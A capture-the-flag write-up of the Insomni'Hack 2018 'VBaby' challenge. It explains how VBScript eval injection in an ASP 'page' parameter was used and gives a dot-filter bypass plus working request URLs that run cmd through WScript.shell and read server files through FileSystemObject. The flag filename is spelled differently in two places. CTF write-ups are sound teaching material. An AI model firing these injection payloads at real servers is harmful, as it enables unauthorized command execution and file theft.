---
title: Insomni'Hack 2018 - VBaby
---

# {{page.title}}
Solves: 22 / Points: 137

## Challenge description
> The admin of this site thinks he's a good dev. Just show him he's not by retrieving the flag on his server!

We start with a URL: http://vbaby.insomni.hack

## Challenge resolution
The website has a single input, the `page` GET parameter. After playing and manually fuzzing this input, the server returns a VBscript compilation error.

After some research, we find out that the server is performing an `eval` call on the provided input. However, the dot (.) character is filtered.

We can use two different technics to bypass the dot filter:
1. using `Chr(46)` and concatenation character `&`.
2. using `page=Request("cmd")` and putting the payload within `cmd` parameter.

In order to execute code in VBS, we can leverage `WScript.shell` object. To read the output of the command (and read file content), we use `scripting.FileSystemObject`.

First, we list files and folders within `C:\` by running `cmd /c dir C:\>C:\temp\dir.txt`:
```shell
http://vbaby.insomni.hack/Default.asp?page=%26Eval(Request("cmd"))&cmd=CreateObject("wscript.shell").Run("cmd+/c+dir+C:\>C:\temp\dir.txt")
```
Then, we read the content of `C:\temp\dir.txt` with:
```shell
http://vbaby.insomni.hack/Default.asp?page=%26Eval(Request("cmd"))&cmd=CreateObject("scripting.FileSystemObject").OpenTextFile("C:\temp\dir.txt").ReadAll
```
![Reading C folder]({{ site.url }}/assets/reading-c-folder.png)

And we find out that the flag is stored within `C:\this_file_contains_the_flags_guys.txt`.

This final request allows us to grab the flag:
```shell
http://vbaby.insomni.hack/Default.asp?page=%26Eval(Request("cmd"))&cmd=CreateObject("scripting.FileSystemObject").OpenTextFile("C:\this_file_contains_the_flag_guys.txt").ReadAll
```
![Reading flag]({{ site.url }}/assets/reading-flag.png)

